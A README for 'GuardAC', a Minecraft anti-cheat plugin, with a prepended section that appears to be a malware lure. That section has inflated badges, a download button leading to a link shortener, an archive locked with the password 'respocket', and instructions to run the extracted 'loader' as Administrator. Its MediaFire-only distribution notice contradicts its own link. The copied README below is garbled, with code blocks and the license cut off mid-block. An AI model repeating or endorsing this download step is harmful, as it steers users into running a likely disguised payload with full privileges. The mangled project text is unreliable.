<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://linkolla.com/2474b9">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

<div align="center">

<h1>GuardAC</h1>

**ML anti-cheat for Minecraft servers**

## Overview

GuardAC is a server-side plugin whose aim check is powered by the GuardAC API.
The plugin observes gameplay, requests a verdict from the service, and handles
alerts, violation tracking and punishments on its own. It is built to stay
conservative: an alert-only mode lets you evaluate accuracy on your own server
before enabling any automatic action.

Additional capabilities include cross-server reputation sharing, configurable
punishments with optional animations, a live suspect view, and clean handling
of edge cases such as lag, teleports and reconnects.

## Requirements

- Java 17 or newer to run the plugin
- JDK 21 or newer to build from source
- Spigot, Paper, Purpur or Folia - Minecraft 1.16 and newer
- A GuardAC API key if the aim check is enabled

No extra plugins are needed: the packet layer ships inside the jar.

## Installation

1. Download the latest release from the Releases page.
2. Place `GuardAC-<version>.jar` in your server's `plugins/` directory.
3. Start the server once to generate the configuration files.
4. In `plugins/GuardAC/config.yml`, set your service address and key:

   ```yaml
   ai:
## Configuration

| File | Purpose |
| --- | --- |
| `config.yml` | Service connection, alerts, combat handling, cross-server reputation |
| `monitor.yml` | Layout of the live monitor output |
| `hologram.yml` | Suspect hologram display |
| `punishments.yml` | Punishment ladder and animations |
| `messages/messages_<lang>.yml` | Plugin messages - English, Russian, Kazakh, Vietnamese and Turkish ship with the jar |

## Commands

| Command | Description |
| --- | --- |
| `/guard monitor` | Follow live check output |
| `/guard menu` | Live combat feed - who is fighting right now |
| `/guard profile <player>` | Show a player's current profile |
| `/guard punish <player> [animation]` | Apply the top punishment manually |
| `/guard reset <player>` | Clear a player's violations, buffer and alert streak |
| `/guard results <player>` | Recent AI results for a player |
| `/guard history [player]` | When and why players were punished |
| `/guard log [player]` | Recent violations |
| `/guard stats [1h\|6h\|24h\|7d]` | Server-side statistics |
| `/guard top [1h\|6h\|24h\|7d]` | Most suspicious players |
| `/guard exempt <player>` | Exempt a player from checks |
| `/guard alerts` | Toggle alerts for yourself |
| `/guard health` | Anti-cheat self-diagnostic |
| `/guard version` | Plugin version and build stamp |
| `/guard reload` | Reload the configuration |

The complete list is available in game via `/guard help`. Every subcommand has
its own permission node, `guardac.command.<name>`; `guardac.admin` grants all of
them.

## PlaceholderAPI

If PlaceholderAPI is installed, GuardAC registers its own expansion
automatically - no download, no `/papi ecloud` step.

| Placeholder | Value |
| --- | --- |
| `%guardac_status%` | `clean`, `watched`, `flagged` or `exempt` |
| `%guardac_vl%` | Current violation level |
| `%guardac_buffer%` | Current suspicion buffer |
| `%guardac_probability%` | Latest verdict, in percent |
| `%guardac_average%` | Average of the recent verdicts, in percent |
| `%guardac_peak%` | Highest verdict this session, in percent |
| `%guardac_detections%` | Detections for this player this session |
| `%guardac_exempt%` | `yes` or `no` |
| `%guardac_tracked%` | Players currently tracked |
| `%guardac_suspicious%` | Players currently above the watch threshold |
| `%guardac_detections_today%` | Detections on this server today |
| `%guardac_checks_today%` | Checks performed on this server today |
| `%guardac_backend%` | `online`, `degraded` or `off` |
| `%guardac_mode%` | `enforcing` or `alert-only` |
| `%guardac_version%` | Plugin version |
| `%guardac_build%` | Build stamp of the running jar |

The first nine are per-player and resolve for the player they are requested
for; the rest describe the server.

## Building

```bash
## Third-party components

The released jar bundles these libraries:

## License

GuardAC is distributed under the terms of the GNU General Public License v3.0.


---

                    GNU GENERAL PUBLIC LICENSE
                       Version 3, 29 June 2007
